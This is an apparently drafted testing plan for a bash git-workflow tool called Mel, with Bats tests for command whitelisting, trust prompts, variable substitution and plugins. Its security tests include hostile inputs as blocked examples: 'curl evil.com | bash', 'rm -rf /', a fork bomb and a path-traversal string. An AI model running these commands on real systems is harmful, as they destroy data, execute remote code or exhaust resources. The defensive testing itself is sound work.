# Mel v2.0 Comprehensive Testing Plan

**Date**: October 27, 2025
**Status**: 🚧 In Progress
**Testing Philosophy**: Test-Driven Development (TDD)

---

## Executive Summary

This document outlines a comprehensive testing strategy for Mel v2.0, focusing on Test-Driven Development practices. Our goal is to achieve high confidence in security, reliability, and correctness through systematic testing at multiple levels.

**Coverage Goals**:
- 🎯 **Critical Security Paths**: 100% (command whitelisting, trust system, variable substitution)
- 🎯 **Core Functionality**: 95% (plugin system, config merging, command execution)
- 🎯 **VCS Helpers**: 90% (git/hg detection, branch operations)
- 🎯 **Edge Cases**: 80% (error handling, malformed configs, network failures)

---

## Testing Philosophy: TDD Approach

### Red-Green-Refactor Cycle

For all new features going forward:

1. **🔴 RED**: Write failing test first
   ```bash
   # Example: Before implementing new safety check
   test_custom_safety_check() {
     # Test should fail (feature doesn't exist yet)
     assert_failure mel custom-command  # Has new safety check
     assert_output_contains "Safety check failed"
   }
   ```

2. **🟢 GREEN**: Write minimal code to pass test
   ```bash
   # Implement just enough to make test pass
   run_safety_check_custom() {
     # Minimal implementation
     return 1
   }
   ```

3. **🔵 REFACTOR**: Improve code quality while keeping tests green
   ```bash
   # Clean up, optimize, add error messages
   run_safety_check_custom() {
     if [[ condition ]]; then
       echo "✖ Safety check failed: reason"
       return 1
     fi
     return 0
   }
   ```

### Testing Principles

- **Write tests before code** for all new features
- **Keep tests simple and focused** (one assertion per test when possible)
- **Test behavior, not implementation** (don't test internal functions unless critical)
- **Make tests fast** (use mocks/stubs for slow operations)
- **Tests should be independent** (no test depends on another)
- **Fail fast** (stop on first error in critical paths)

---

## Testing Framework

### Primary Framework: Bats (Bash Automated Testing System)

**Why Bats?**
- ✅ Designed for bash scripts
- ✅ TAP (Test Anything Protocol) compliant
- ✅ Simple, readable syntax
- ✅ Good CI/CD integration
- ✅ Active maintenance

**Installation**:
```bash
# macOS
brew install bats-core

# Linux
git clone https://github.com/bats-core/bats-core.git
cd bats-core
./install.sh /usr/local
```

**Bats Helpers**:
- `bats-support` - Additional assertions
- `bats-assert` - Better assertion helpers
- `bats-file` - File/directory assertions

### Alternative: shUnit2

For more traditional xUnit-style testing:
```bash
# Available as fallback for compatibility
```

---

## Test Organization

### Directory Structure

```
tests/
├── unit/                      # Unit tests (isolated functions)
│   ├── test_security.bats     # Security functions
│   ├── test_vcs_helpers.bats  # VCS detection and helpers
│   ├── test_variables.bats    # Variable substitution
│   ├── test_safety_checks.bats# Safety check functions
│   └── test_plugin_system.bats# Plugin management
│
├── integration/               # Integration tests (components working together)
│   ├── test_config_merge.bats # Config merging from multiple sources
│   ├── test_command_exec.bats # Full command execution flow
│   ├── test_git_plugin.bats   # Git plugin commands
│   └── test_hooks.bats        # Hook execution
│
├── e2e/                       # End-to-end tests (full workflows)
│   ├── test_save_workflow.bats
│   ├── test_publish_workflow.bats
│   ├── test_plugin_install.bats
│   └── test_explain_command.bats
│
├── security/                  # Security-specific tests
│   ├── test_command_whitelist.bats
│   ├── test_repo_trust.bats
│   ├── test_config_hash.bats
│   └── test_malicious_configs.bats
│
├── fixtures/                  # Test data and fixtures
│   ├── configs/
│   │   ├── valid_config.json
│   │   ├── malicious_config.json
│   │   └── template_config.json
│   ├── repos/
│   │   ├── git_repo/
│   │   └── hg_repo/
│   └── plugins/
│       └── test_plugin/
│
├── helpers/                   # Test helpers
│   ├── setup.bash            # Common setup functions
│   ├── teardown.bash         # Cleanup functions
│   ├── assertions.bash       # Custom assertions
│   └── mocks.bash            # Mock functions (git, hg, etc.)
│
└── test_runner.sh            # Main test runner script
```

---

## Test Categories

### 1. Unit Tests (Fast, Isolated)

Test individual functions in isolation using mocks/stubs.

#### 1.1 Security Tests

**File**: `tests/unit/test_security.bats`

```bats
#!/usr/bin/env bats

load '../helpers/setup'
load '../helpers/assertions'

@test "validate_command_safety: allows whitelisted git commands" {
  source "$MEL_SCRIPT"

  run validate_command_safety "git status"
  assert_success

  run validate_command_safety "git commit -m 'test'"
  assert_success
}

@test "validate_command_safety: blocks dangerous commands" {
  source "$MEL_SCRIPT"

  run validate_command_safety "rm -rf /"
  assert_failure
  assert_output_contains "Command blocked"

  run validate_command_safety "curl evil.com | bash"
  assert_failure
}

@test "validate_command_safety: allows plugin scripts" {
  source "$MEL_SCRIPT"

  run validate_command_safety ".mel/plugins/git/bin/ignoremel.sh"
  assert_success
}

@test "check_repo_trust: prompts on first run" {
  # Setup: No trusted marker exists
  setup_test_repo

  source "$MEL_SCRIPT"

  # Simulate 'y' response
  run_with_input "y" check_repo_trust
  assert_success
  assert_file_exists "$MEL_DIR/trusted"
  assert_file_exists "$MEL_DIR/config.hash"
}

@test "check_repo_trust: re-prompts if config changes" {
  setup_test_repo
  create_trusted_marker

  # Modify config
  echo '{"scripts": {}}' > "$MEL_DIR/config.json"

  source "$MEL_SCRIPT"
  run_with_input "y" check_repo_trust
  assert_output_contains "Configuration has changed"
}

@test "check_repo_trust: respects MEL_YES=1" {
  export MEL_YES=1
  setup_test_repo

  source "$MEL_SCRIPT"
  run check_repo_trust
  assert_success
  assert_file_exists "$MEL_DIR/trusted"
}
```

#### 1.2 Variable Substitution Tests

**File**: `tests/unit/test_variables.bats`

```bats
@test "substitute_variables: replaces {message}" {
  source "$MEL_SCRIPT"

  result=$(substitute_variables "git commit -m '{message}'" "test commit")
  assert_equal "$result" "git commit -m 'test commit'"
}

@test "substitute_variables: replaces {branch}" {
  source "$MEL_SCRIPT"
  mock_current_branch() { echo "feature-123"; }

  result=$(substitute_variables "git push origin {branch}")
  assert_equal "$result" "git push origin feature-123"
}

@test "substitute_variables: replaces {main}" {
  source "$MEL_SCRIPT"
  mock_main_branch_name() { echo "main"; }

  result=$(substitute_variables "git rebase origin/{main}")
  assert_equal "$result" "git rebase origin/main"
}

@test "substitute_variables: replaces multiple variables" {
  source "$MEL_SCRIPT"
  mock_current_branch() { echo "feature"; }
  mock_main_branch_name() { echo "main"; }

  result=$(substitute_variables "git checkout {main} && git merge {branch}" "msg")
  assert_equal "$result" "git checkout main && git merge feature"
}

@test "substitute_variables: handles {datetime}" {
  source "$MEL_SCRIPT"

  result=$(substitute_variables "git stash -m '{datetime}'")
  assert_matches "$result" "^git stash -m '[0-9]{4}-[0-9]{2}-[0-9]{2} [0-9]{2}:[0-9]{2}'$"
}

@test "substitute_variables: handles positional args {0} {1}" {
  source "$MEL_SCRIPT"

  result=$(substitute_variables "git checkout -B {0} origin/{1}" "mybranch" "main")
  assert_equal "$result" "git checkout -B mybranch origin/main"
}
```

#### 1.3 VCS Helper Tests

**File**: `tests/unit/test_vcs_helpers.bats`

```bats
@test "detect_vcs: detects git repository" {
  setup_git_repo
  source "$MEL_SCRIPT"

  result=$(detect_vcs)
  assert_equal "$result" "git"
}

@test "detect_vcs: detects mercurial repository" {
  setup_hg_repo
  source "$MEL_SCRIPT"

  result=$(detect_vcs)
  assert_equal "$result" "hg"
}

@test "detect_vcs: returns error for non-repo" {
  setup_empty_dir
  source "$MEL_SCRIPT"

  run detect_vcs
  assert_failure
}

@test "current_branch: returns git branch name" {
  setup_git_repo
  git checkout -b test-branch
  source "$MEL_SCRIPT"

  result=$(current_branch)
  assert_equal "$result" "test-branch"
}

@test "main_branch_name: detects 'main'" {
  setup_git_repo_with_main
  source "$MEL_SCRIPT"

  result=$(main_branch_name)
  assert_equal "$result" "main"
}

@test "main_branch_name: detects 'master'" {
  setup_git_repo_with_master
  source "$MEL_SCRIPT"

  result=$(main_branch_name)
  assert_equal "$result" "master"
}

@test "has_uncommitted_changes: detects modified files" {
  setup_git_repo
  echo "change" >> file.txt
  source "$MEL_SCRIPT"

  run has_uncommitted_changes
  assert_success  # Returns 0 when changes exist
}

@test "has_uncommitted_changes: clean working tree" {
  setup_git_repo
  git add -A && git commit -m "clean"
  source "$MEL_SCRIPT"

  run has_uncommitted_changes
  assert_failure  # Returns 1 when clean
}
```

#### 1.4 Safety Check Tests

**File**: `tests/unit/test_safety_checks.bats`

```bats
@test "run_safety_checks: not_on_main prevents execution on main" {
  setup_git_repo_with_main
  git checkout main
  source "$MEL_SCRIPT"

  run run_safety_checks '["not_on_main"]'
  assert_failure
  assert_output_contains "Cannot run this command on main branch"
}

@test "run_safety_checks: not_on_main allows on feature branch" {
  setup_git_repo
  git checkout -b feature
  source "$MEL_SCRIPT"

  run run_safety_checks '["not_on_main"]'
  assert_success
}

@test "run_safety_checks: clean_working_tree requires no changes" {
  setup_git_repo
  echo "change" >> file.txt
  source "$MEL_SCRIPT"

  run run_safety_checks '["clean_working_tree"]'
  assert_failure
  assert_output_contains "uncommitted changes"
}

@test "run_safety_checks: has_remote requires origin" {
  setup_git_repo  # No remote
  source "$MEL_SCRIPT"

  run run_safety_checks '["has_remote"]'
  assert_failure
  assert_output_contains "No remote"
}

@test "run_safety_checks: multiple checks pass when all satisfied" {
  setup_git_repo_with_remote
  git checkout -b feature
  git add -A && git commit -m "clean"
  source "$MEL_SCRIPT"

  run run_safety_checks '["not_on_main", "clean_working_tree", "has_remote"]'
  assert_success
}
```

### 2. Integration Tests (Components Together)

#### 2.1 Config Merging Tests

**File**: `tests/integration/test_config_merge.bats`

```bats
@test "load_merged_config: merges builtin + global plugin configs" {
  setup_test_environment
  create_builtin_plugin "test" '{"scripts": {"cmd1": "builtin"}}'
  create_global_plugin "test" '{"scripts": {"cmd2": "global"}}'

  source "$MEL_SCRIPT"
  config=$(load_merged_config)

  assert_json_has_key "$config" ".scripts.cmd1"
  assert_json_has_key "$config" ".scripts.cmd2"
}

@test "load_merged_config: global plugin overrides builtin" {
  setup_test_environment
  create_builtin_plugin "git" '{"scripts": {"save": {"description": "builtin"}}}'
  create_global_plugin "git" '{"scripts": {"save": {"description": "custom"}}}'

  source "$MEL_SCRIPT"
  config=$(load_merged_config)

  desc=$(echo "$config" | jq -r '.scripts.save.description')
  assert_equal "$desc" "custom"
}

@test "load_merged_config: user config overrides plugins" {
  setup_test_environment
  create_builtin_plugin "git" '{"scripts": {"save": "builtin"}}'
  create_user_config '{"scripts": {"save": "user override"}}'

  source "$MEL_SCRIPT"
  config=$(load_merged_config)

  save_cmd=$(echo "$config" | jq -r '.scripts.save')
  assert_equal "$save_cmd" "user override"
}

@test "load_merged_config: hooks are appended, not replaced" {
  setup_test_environment
  create_builtin_plugin "git" '{"hooks": {"pre_command": ["hook1"]}}'
  create_user_config '{"hooks": {"pre_command": ["hook2"]}}'

  source "$MEL_SCRIPT"
  config=$(load_merged_config)

  hooks=$(echo "$config" | jq -r '.hooks.pre_command | length')
  assert_equal "$hooks" "2"
}
```

#### 2.2 Command Execution Tests

**File**: `tests/integration/test_command_exec.bats`

```bats
@test "execute_command: runs simple string command" {
  setup_test_environment
  config='{"scripts": {"test": "echo hello"}}'

  source "$MEL_SCRIPT"
  run execute_command "$config" "test"
  assert_success
  assert_output "hello"
}

@test "execute_command: runs command array" {
  setup_test_environment
  config='{"scripts": {"test": {"commands": ["echo first", "echo second"]}}}'

  source "$MEL_SCRIPT"
  run execute_command "$config" "test"
  assert_success
  assert_line 0 "first"
  assert_line 1 "second"
}

@test "execute_command: substitutes variables" {
  setup_test_environment
  mock_current_branch() { echo "feature"; }
  config='{"scripts": {"test": "echo {branch}"}}'

  source "$MEL_SCRIPT"
  run execute_command "$config" "test"
  assert_output "feature"
}

@test "execute_command: validates safety checks before execution" {
  setup_git_repo_with_main
  git checkout main
  config='{"scripts": {"test": {"safety_checks": ["not_on_main"], "commands": ["echo should_not_run"]}}}'

  source "$MEL_SCRIPT"
  run execute_command "$config" "test"
  assert_failure
  refute_output "should_not_run"
}

@test "execute_command: runs pre and post hooks" {
  setup_test_environment
  config='{"scripts": {"test": "echo main"}, "hooks": {"pre_command": ["echo before"], "post_command": ["echo after"]}}'

  source "$MEL_SCRIPT"
  run execute_command "$config" "test"
  assert_line 0 "before"
  assert_line 1 "main"
  assert_line 2 "after"
}

@test "execute_command: blocks unsafe commands" {
  setup_test_environment
  config='{"scripts": {"danger": "rm -rf /"}}'

  source "$MEL_SCRIPT"
  run execute_command "$config" "danger"
  assert_failure
  assert_output_contains "Command blocked"
}
```

### 3. End-to-End Tests (Full Workflows)

#### 3.1 Git Plugin Workflow Tests

**File**: `tests/e2e/test_git_workflows.bats`

```bats
@test "mel save: commits, rebases, and pushes" {
  setup_git_repo_with_remote
  git checkout -b feature
  echo "change" > file.txt

  run mel save "test commit"
  assert_success

  # Verify commit was created
  assert_git_log_contains "test commit"

  # Verify rebase happened
  assert_git_log_linear

  # Verify push attempted (may fail in test, that's ok)
}

@test "mel save: blocked on main branch" {
  setup_git_repo_with_main
  git checkout main
  echo "change" > file.txt

  run mel save "should fail"
  assert_failure
  assert_output_contains "Cannot run this command on main"
}

@test "mel publish: merges to main with FF-only" {
  setup_git_repo_with_remote
  git checkout -b feature
  echo "change" > file.txt
  git add -A && git commit -m "feature work"

  # Mock confirmation
  run_with_input "y" mel publish

  # Check main has the commit
  git checkout main
  assert_git_log_contains "feature work"
}

@test "mel branch: creates new branch from main" {
  setup_git_repo_with_main
  git checkout main

  run mel branch new-feature
  assert_success

  current=$(git branch --show-current)
  assert_equal "$current" "new-feature"

  # Should be based on main
  assert_git_divergence_from_main 0
}

@test "mel status: shows clean working tree" {
  setup_git_repo
  git add -A && git commit -m "clean"

  run mel status
  assert_success
  assert_output_contains "nothing to commit"
}

@test "mel diff: shows unstaged changes" {
  setup_git_repo
  echo "change" > file.txt

  run mel diff
  assert_success
  assert_output_contains "file.txt"
}
```

#### 3.2 Plugin Management Tests

**File**: `tests/e2e/test_plugin_management.bats`

```bats
@test "mel plugin list: shows installed and available plugins" {
  setup_test_environment
  create_builtin_plugin "git"
  create_builtin_plugin "hg"
  install_global_plugin "git"

  run mel plugin list
  assert_success
  assert_output_contains "git (global)"
  assert_output_contains "hg"
}

@test "mel plugin install: copies builtin to global" {
  setup_test_environment
  create_builtin_plugin "test_plugin"

  run mel plugin install test_plugin
  assert_success
  assert_dir_exists "$GLOBAL_PLUGINS_DIR/test_plugin"
  assert_output_contains "Installed plugin 'test_plugin'"
}

@test "mel plugin install: fails for non-existent plugin" {
  setup_test_environment

  run mel plugin install nonexistent
  assert_failure
  assert_output_contains "not found"
}

@test "mel plugin remove: deletes from global" {
  setup_test_environment
  install_global_plugin "test_plugin"

  run mel plugin remove test_plugin
  assert_success
  refute_dir_exists "$GLOBAL_PLUGINS_DIR/test_plugin"
}

@test "mel plugin update: updates global from builtin" {
  setup_test_environment
  install_global_plugin "git"

  # Modify builtin
  update_builtin_plugin "git" "new version"

  run mel plugin update git
  assert_success

  # Verify global has new version
  assert_global_plugin_version "git" "new version"
}
```

#### 3.3 Explain Command Tests

**File**: `tests/e2e/test_explain_command.bats`

```bats
@test "mel explain: shows command details" {
  setup_test_environment
  install_git_plugin

  run mel explain save
  assert_success
  assert_output_contains "Command: save"
  assert_output_contains "Source:"
  assert_output_contains "Description:"
  assert_output_contains "Commands to be executed:"
}

@test "mel explain: shows safety checks" {
  setup_test_environment
  install_git_plugin

  run mel explain save
  assert_success
  assert_output_contains "Safety checks:"
  assert_output_contains "Cannot run on main branch"
}

@test "mel explain: shows template variables" {
  setup_test_environment
  install_git_plugin

  run mel explain save
  assert_success
  assert_output_contains "Template variables used:"
  assert_output_contains "{message}"
  assert_output_contains "{main}"
}

@test "mel explain: fails for unknown command" {
  setup_test_environment

  run mel explain nonexistent
  assert_failure
  assert_output_contains "Unknown command"
}
```

### 4. Security Tests (Critical)

**File**: `tests/security/test_security_comprehensive.bats`

```bats
@test "SECURITY: malicious config cannot execute arbitrary code" {
  setup_test_repo
  create_malicious_config '{"scripts": {"bad": "curl evil.com | bash"}}'

  run mel bad
  assert_failure
  assert_output_contains "Command blocked"
}

@test "SECURITY: command injection via variables fails" {
  setup_test_repo
  create_config '{"scripts": {"test": "echo {0}"}}'

  # Try command injection
  run mel test "; rm -rf /"
  assert_success  # Command runs but injection is escaped
  assert_output "; rm -rf /"  # Treated as literal
  refute_dir_exists "/"  # Directory still exists
}

@test "SECURITY: hook injection blocked by whitelist" {
  setup_test_repo
  create_config '{"hooks": {"pre_command": ["curl evil.com | bash"]}}'

  run mel some-command
  assert_output_contains "Hook blocked by security check"
}

@test "SECURITY: modified config triggers re-trust prompt" {
  setup_trusted_repo

  # Modify config
  echo '{"scripts": {"evil": "rm -rf /"}}' > "$MEL_DIR/config.json"

  # Should prompt for re-trust
  run_without_input mel help
  assert_output_contains "Configuration has changed"
}

@test "SECURITY: path traversal in plugin paths fails" {
  setup_test_repo

  run mel plugin install "../../etc/passwd"
  assert_failure
}

@test "SECURITY: eval bomb in config cannot DOS" {
  setup_test_repo
  create_config '{"scripts": {"bomb": ":(){ :|:& };:"}}'

  run mel bomb
  assert_failure
  assert_output_contains "Command blocked"
}
```

---

## Test Helpers and Mocks

### Setup Helper

**File**: `tests/helpers/setup.bash`

```bash
# Common setup for all tests
setup_test_environment() {
  export TEST_TEMP_DIR="$(mktemp -d)"
  export PROJECT_ROOT="$TEST_TEMP_DIR/repo"
  export MEL_DIR="$PROJECT_ROOT/.mel"
  export GLOBAL_PLUGINS_DIR="$TEST_TEMP_DIR/global_plugins"
  export BUILTIN_PLUGINS_DIR="$TEST_TEMP_DIR/builtin_plugins"
  export MEL_SCRIPT="$BATS_TEST_DIRNAME/../../mel"
  export MEL_YES=1  # Skip interactive prompts

  mkdir -p "$PROJECT_ROOT"
  mkdir -p "$GLOBAL_PLUGINS_DIR"
  mkdir -p "$BUILTIN_PLUGINS_DIR"
  cd "$PROJECT_ROOT"
}

teardown_test_environment() {
  cd /
  rm -rf "$TEST_TEMP_DIR"
}

setup_git_repo() {
  setup_test_environment
  cd "$PROJECT_ROOT"
  git init
  git config user.name "Test User"
  git config user.email "test@example.com"
  echo "initial" > README.md
  git add README.md
  git commit -m "Initial commit"
}

setup_git_repo_with_remote() {
  setup_git_repo
  git remote add origin "https://github.com/test/test.git"
}

setup_hg_repo() {
  setup_test_environment
  cd "$PROJECT_ROOT"
  hg init
  echo "[ui]" > .hg/hgrc
  echo "username = Test User <test@example.com>" >> .hg/hgrc
  echo "initial" > README.md
  hg add README.md
  hg commit -m "Initial commit"
}

create_user_config() {
  local content="$1"
  mkdir -p "$MEL_DIR"
  echo "$content" > "$MEL_DIR/config.json"
}

create_builtin_plugin() {
  local name="$1"
  local config="${2:-{}}"
  mkdir -p "$BUILTIN_PLUGINS_DIR/$name"
  echo "$config" > "$BUILTIN_PLUGINS_DIR/$name/config.json"
}

create_global_plugin() {
  local name="$1"
  local config="${2:-{}}"
  mkdir -p "$GLOBAL_PLUGINS_DIR/$name"
  echo "$config" > "$GLOBAL_PLUGINS_DIR/$name/config.json"
}

create_trusted_marker() {
  mkdir -p "$MEL_DIR"
  touch "$MEL_DIR/trusted"
  echo '{"plugins": []}' > "$MEL_DIR/config.json"
  sha256sum "$MEL_DIR/config.json" | cut -d' ' -f1 > "$MEL_DIR/config.hash"
}
```

### Assertion Helpers

**File**: `tests/helpers/assertions.bash`

```bash
assert_json_has_key() {
  local json="$1"
  local key="$2"

  result=$(echo "$json" | jq -e "$key" 2>/dev/null)
  if [[ $? -ne 0 ]]; then
    echo "Expected JSON to have key '$key'" >&2
    return 1
  fi
}

assert_file_exists() {
  local file="$1"
  if [[ ! -f "$file" ]]; then
    echo "Expected file to exist: $file" >&2
    return 1
  fi
}

assert_dir_exists() {
  local dir="$1"
  if [[ ! -d "$dir" ]]; then
    echo "Expected directory to exist: $dir" >&2
    return 1
  fi
}

refute_dir_exists() {
  local dir="$1"
  if [[ -d "$dir" ]]; then
    echo "Expected directory to NOT exist: $dir" >&2
    return 1
  fi
}

assert_output_contains() {
  local expected="$1"
  if [[ "$output" != *"$expected"* ]]; then
    echo "Expected output to contain: $expected" >&2
    echo "Actual output: $output" >&2
    return 1
  fi
}

assert_git_log_contains() {
  local message="$1"
  if ! git log --oneline | grep -q "$message"; then
    echo "Expected git log to contain: $message" >&2
    return 1
  fi
}
```

### Mock Functions

**File**: `tests/helpers/mocks.bash`

```bash
# Mock git commands for testing
mock_git() {
  git() {
    case "$1" in
      status)
        echo "On branch main"
        echo "nothing to commit, working tree clean"
        ;;
      branch)
        if [[ "$2" == "--show-current" ]]; then
          echo "main"
        fi
        ;;
      *)
        command git "$@"
        ;;
    esac
  }
}

# Mock current branch
mock_current_branch() {
  current_branch() {
    echo "${MOCK_BRANCH:-main}"
  }
}

# Run command with input
run_with_input() {
  local input="$1"
  shift
  echo "$input" | "$@"
}

run_without_input() {
  echo "" | "$@"
}
```

---

## Test Runner

**File**: `tests/test_runner.sh`

```bash
#!/bin/bash

set -e

echo "🧪 Mel Test Suite"
echo "================="
echo ""

# Check dependencies
if ! command -v bats &> /dev/null; then
  echo "❌ bats not found. Install with: brew install bats-core"
  exit 1
fi

if ! command -v jq &> /dev/null; then
  echo "❌ jq not found. Install with: brew install jq"
  exit 1
fi

echo "✅ Dependencies OK"
echo ""

# Run tests by category
categories=("unit" "integration" "e2e" "security")

failed=0
passed=0

for category in "${categories[@]}"; do
  echo "📁 Running $category tests..."
  if bats tests/$category/*.bats; then
    ((passed++))
  else
    ((failed++))
  fi
  echo ""
done

echo "================="
echo "📊 Results:"
echo "  ✅ Passed: $passed categories"
echo "  ❌ Failed: $failed categories"
echo ""

if [[ $failed -gt 0 ]]; then
  echo "❌ Tests failed"
  exit 1
else
  echo "✅ All tests passed!"
  exit 0
fi
```

---

## CI/CD Integration

### GitHub Actions

**File**: `.github/workflows/test.yml`

```yaml
name: Tests

on:
  push:
    branches: [ main, shellbased, claude/* ]
  pull_request:
    branches: [ main ]

jobs:
  test:
    runs-on: ${{ matrix.os }}
    strategy:
      matrix:
        os: [ubuntu-latest, macos-latest]
        bash-version: ['3.2', '4.4', '5.1']

    steps:
    - uses: actions/checkout@v3

    - name: Install dependencies
      run: |
        if [ "$RUNNER_OS" == "macOS" ]; then
          brew install bats-core jq git
        else
          sudo apt-get update
          sudo apt-get install -y bats jq git
        fi

    - name: Run tests
      run: ./tests/test_runner.sh

    - name: Upload coverage
      if: matrix.os == 'ubuntu-latest'
      uses: codecov/codecov-action@v3
      with:
        files: ./coverage/coverage.txt
```

---

## Coverage Goals and Metrics

### Critical Paths (Must have 100% coverage)

1. **Security**:
   - Command whitelisting
   - Repository trust system
   - Config hash validation
   - Variable substitution (injection prevention)

2. **Safety Checks**:
   - not_on_main
   - clean_working_tree
   - has_remote

3. **Plugin System**:
   - Config merging (builtin → global → user)
   - Plugin installation
   - Plugin resolution

### Coverage Tracking

Use `kcov` for bash code coverage:

```bash
# Install kcov
brew install kcov  # macOS
apt-get install kcov  # Linux

# Run tests with coverage
kcov --exclude-pattern=/usr coverage/ bats tests/**/*.bats

# View report
open coverage/index.html
```

---

## TDD Workflow Example

### Example: Adding a new safety check

**Step 1: Write failing test** 🔴

```bats
# tests/unit/test_safety_checks.bats

@test "run_safety_checks: branch_name_pattern requires matching branch name" {
  setup_git_repo
  git checkout -b invalid-branch-name
  source "$MEL_SCRIPT"

  run run_safety_checks '["branch_name_pattern:^feature-"]'
  assert_failure
  assert_output_contains "Branch name must match pattern"
}
```

Run: `bats tests/unit/test_safety_checks.bats`
Result: ❌ FAIL (feature doesn't exist)

**Step 2: Write minimal code** 🟢

```bash
# In mel script

run_safety_check_branch_name_pattern() {
  local pattern="$1"
  local branch=$(current_branch)

  if ! [[ "$branch" =~ $pattern ]]; then
    echo "✖ Safety check failed: Branch name must match pattern: $pattern"
    return 1
  fi
  return 0
}

# Update run_safety_checks to call new function
```

Run: `bats tests/unit/test_safety_checks.bats`
Result: ✅ PASS

**Step 3: Refactor** 🔵

- Add better error messages
- Add to documentation
- Add integration test
- Add to git plugin where needed

**Step 4: Commit**

```bash
git add tests/unit/test_safety_checks.bats mel
git commit -m "Add branch_name_pattern safety check

Tests added first (TDD), then implementation.
Allows teams to enforce branch naming conventions."
```

---

## Performance Testing

### Benchmark Suite

**File**: `tests/performance/bench_startup.sh`

```bash
#!/bin/bash

echo "⚡ Performance Benchmarks"
echo ""

# Test startup time
echo "Testing startup time..."
times=()
for i in {1..100}; do
  start=$(date +%s%N)
  ./mel --version >/dev/null
  end=$(date +%s%N)
  duration=$(( (end - start) / 1000000 ))  # Convert to ms
  times+=($duration)
done

# Calculate average
avg=$(IFS=+; echo "$((${times[*]} / ${#times[@]}))")
echo "✅ Average startup time: ${avg}ms"

if [[ $avg -gt 50 ]]; then
  echo "⚠️  Warning: Startup time exceeds 50ms target"
fi

# Test command execution time
echo ""
echo "Testing command execution time..."
start=$(date +%s%N)
./mel status >/dev/null
end=$(date +%s%N)
duration=$(( (end - start) / 1000000 ))
echo "✅ 'mel status' execution: ${duration}ms"

# Test config loading time
echo ""
echo "Testing config loading time..."
# Create large config with many plugins
# Measure load time

echo ""
echo "✅ Performance benchmarks complete"
```

---

## Test Maintenance

### Regular Tasks

1. **Daily**: Run test suite before committing
2. **Weekly**: Review coverage reports, add missing tests
3. **Monthly**: Update fixtures, review flaky tests
4. **Per Feature**: Add tests before implementing (TDD)

### Test Quality Checklist

- [ ] Tests are independent (no shared state)
- [ ] Tests are fast (< 100ms per test when possible)
- [ ] Tests are focused (one thing per test)
- [ ] Tests have clear names describing what they test
- [ ] Tests use setup/teardown properly
- [ ] Mocks are used for slow operations
- [ ] Fixtures are realistic
- [ ] Assertions are specific and helpful

---

## Open Questions / TODO

- [ ] Add property-based testing with QuickCheck for bash?
- [ ] Add mutation testing to verify test quality?
- [ ] Performance regression testing in CI?
- [ ] Visual regression testing for help output?
- [ ] Fuzz testing for config parsing?
- [ ] Load testing (1000+ plugins, large repos)?

---

## Conclusion

This testing plan provides:

✅ **Comprehensive coverage** of all critical paths
✅ **TDD workflow** for future development
✅ **Fast feedback loop** for developers
✅ **CI/CD integration** for automated testing
✅ **Security focus** with dedicated test suite
✅ **Performance tracking** to prevent regressions

By following this plan and the TDD approach, we ensure Mel v2.0 is robust, secure, and maintainable.

---

**Next Steps**:
1. Install bats and dependencies
2. Create test directory structure
3. Implement setup helpers
4. Write unit tests for security functions (highest priority)
5. Add CI/CD workflow
6. Achieve 100% coverage of critical paths
7. Continue with TDD for all new features

**Status**: 📝 Plan Complete - Ready for Implementation
